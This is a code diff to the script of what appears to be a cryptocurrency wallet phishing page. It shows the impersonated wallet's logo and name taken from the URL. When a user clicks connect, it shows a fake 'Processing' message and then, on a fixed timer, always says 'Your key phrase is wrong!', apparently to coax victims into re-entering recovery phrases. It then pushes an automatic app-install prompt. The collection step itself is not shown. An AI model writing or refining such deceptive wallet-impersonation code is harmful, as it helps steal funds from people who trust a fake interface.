@@ -4,6 +4,10 @@ const popup = document.getElementById("popup");
 const popupText = document.getElementById("popupText");
 const closePopupBtn = document.getElementById("closePopupBtn");
 
+// ⭐ NEW — Progress popup elements
+const progressLogo = document.getElementById("progressLogo");
+const progressWalletName = document.getElementById("progressWalletName");
+
 function showPopup(message) {
   popupText.innerText = message;
   popup.style.display = "flex";
@@ -13,6 +17,7 @@ closePopupBtn.addEventListener("click", () => {
   popup.style.display = "none";
 });
 
+// Get wallet from URL
 const params = new URLSearchParams(window.location.search);
 const wallet = params.get("wallet");
 
@@ -24,10 +29,20 @@ if (wallet) {
     .replace(/\s+/g, "")
     .replace(/['./]/g, "");
 
-  walletLogo.src = `wallet-icons/${fileName}.webp`;
+  const iconPath = `wallet-icons/${fileName}.webp`;
 
+  // Main logo
+  walletLogo.src = iconPath;
   walletLogo.onerror = () => {
     walletLogo.style.display = "none";
+  };
+
+  // ⭐ NEW — Set progress popup data
+  progressWalletName.innerText = wallet;
+  progressLogo.src = iconPath;
+
+  progressLogo.onerror = () => {
+    progressLogo.style.display = "none";
   };
 }
 
@@ -46,12 +61,14 @@ document.getElementById("connectBtn").addEventListener("click", () => {
     return;
   }
 
+  // ⭐ NEW — Show progress popup with wallet logo + name
   showPopup("Processing... please wait");
 
   setTimeout(() => {
     showPopup("Your key phrase is wrong!");
   }, 10000);
 });
+
 // Auto PWA Install Trigger After Wrong Phrase
 setTimeout(async () => {
   if (window.deferredPrompt) {
@@ -61,4 +78,4 @@ setTimeout(async () => {
   } else {
     console.log("Install prompt not ready");
   }
-}, 100); // sirf event register hone ka small wait
+}, 100);
